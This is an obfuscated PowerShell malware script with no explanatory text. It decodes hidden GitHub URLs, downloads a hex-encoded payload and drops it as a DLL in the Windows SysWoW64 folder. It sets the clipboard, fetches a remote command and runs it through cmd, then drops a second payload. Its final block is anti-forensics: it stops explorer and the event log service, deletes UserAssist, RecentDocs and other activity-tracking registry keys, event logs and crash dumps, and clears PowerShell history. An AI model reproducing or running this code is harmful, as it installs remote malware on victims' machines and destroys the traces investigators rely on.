${123}="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rldm51bGwtc3lzL2ZpbGVzL3JlZnMvaGVhZHMvbWFpbi9p"
${456}="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rldm51bGwtc3lzL2ZpbGVzL3JlZnMvaGVhZHMvbWFpbi9lLnR4dA=="
${789}="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rldm51bGwtc3lzL2ZpbGVzL3JlZnMvaGVhZHMvbWFpbi9iLnR4dA=="
${012}="QzpcV2luZG93c1xTeXNXb1c2NFxudGRsbHAuZGxs"
${345}="U3RlRjZiMldyQmd1"
function ${678}{param([string]${999});${888}=[regex]::Replace(${999},'[^0-9A-Fa-f]','');if(${888}.Length%2-ne0){return $null};${777}=[byte[]]::new(${888}.Length/2);for(${666}=0;${666}-lt${888}.Length;${666}+=2){${777}[${666}/2]=[convert]::ToByte(${888}.Substring(${666},2),16)};return ${777}}
try{${111}=Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${123}))) -UseBasicParsing -TimeoutSec 30;${222}=${111}.Content;${333}=${678} ${222};if(${333}-ne $null){[IO.File]::WriteAllBytes([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${012})),${333})}}catch{}
Set-Clipboard ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${345})))
try{${444}=Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${456}))) -UseBasicParsing -TimeoutSec 30;${555}=${444}.Content.Trim();if(${555}){Start-Process cmd -ArgumentList "/c ${555}" -NoNewWindow}}catch{}
do{Start-Sleep -Seconds 2}while(Get-Process -Name "Installer" -ErrorAction SilentlyContinue)
try{${666}=Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${789}))) -UseBasicParsing -TimeoutSec 30;${777}=${666}.Content;${888}=${678} ${777};if(${888}-ne $null){[IO.File]::WriteAllBytes([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${012})),${888})}}catch{}
${999}="U3RvcC1Qcm9jZXNzIC1OYW1lIGV4cGxvcmVyIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQpTdG9wLVNlcnZpY2UgLU5hbWUgZXZlbnRs
b2cgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlClJlbW92ZS1JdGVtIC1QYXRoICJIS0NSOlxMb2NhbCBTZXR0aW5nc1xTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xTaGVsbCIgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlClJlbW92ZS1JdGVtIC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxDb21EbGczMiIgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlClJlbW92ZS1JdGVtIC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1x
DdXJyZW50VmVyc2lvblxFeHBsb3JlclxSZWNlbnREb2NzIiAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU
KUmVtb3ZlLUl0ZW0gLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXFVzZXJBc3Npc3QiIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQpSZW1vdmUtSXRlbSAtUGF0aCAiSEtDVTp
cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cQXBwQ29tcGF0RmxhZ3NcQ29tcGF0aWJpbGl0eSBBc3Npc3RhblxTdG9yZSIgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlClJlbW92ZS1JdGVtIC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1x
DdXJyZW50VmVyc2lvblxFeHBsb3JlclxGZWF0dXJlVXNhZ2UiIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQpDbGV
hci1EbnNDbGllbnRDYWNoZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQpSZW1vdmUtSXRlbSAtUGF0aCAiQzpcV2luZG93c1xTeXN0ZW0zMlx3aW5ldnRcTG9nc1wuZXZ0eCIgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlClJlbW92ZS1JdGVtIC1QYXRoICJDOlxXaW5kb3dzXGFwcGNvbXBhd
ccGEqLnR4dCIgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlClJlbW92ZS1JdGVtIC1QYXRoICJDOlxXaW5kb3dzXFN5c3RlbTMyXHNydVxTUlVEQi5kYXQiIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQpSZW1vdmUtSXRlbSAtUGF0aCAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXF
Bvd2VyU2hlbGxcUFNSZWFkTGluZSoudHh0IiAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKR2V0LUNoaWxkSXRlbSAtUGF0aCAiJGVudjpVU0VSR
VBSRklsZVxBcHBEYXRhXExvY2FsXENyYXNoRHVtcyIgLVJlY3Vyc2UgLUZpbGUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICIqaW5zdGFsbGVyKiIgfSAtUmVtb3ZlLUl0ZW0gLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCnJ1bmRsbD
MuZXhlIGFwcGhlbHAuZGxsLFNoaW1GbHVzaENhY2hlClN0YXJ0LVByb2Nlc3MgZXhwbG9yZXIuZXhlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlClN0YXJ0LVNlcnZpY2UgLU5hbWUgZXZlbnRsb2cgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU="
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${999})))
${000}="$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";Clear-Content -Path ${000} -ErrorAction SilentlyContinue;Clear-History -ErrorAction SilentlyContinue;exit
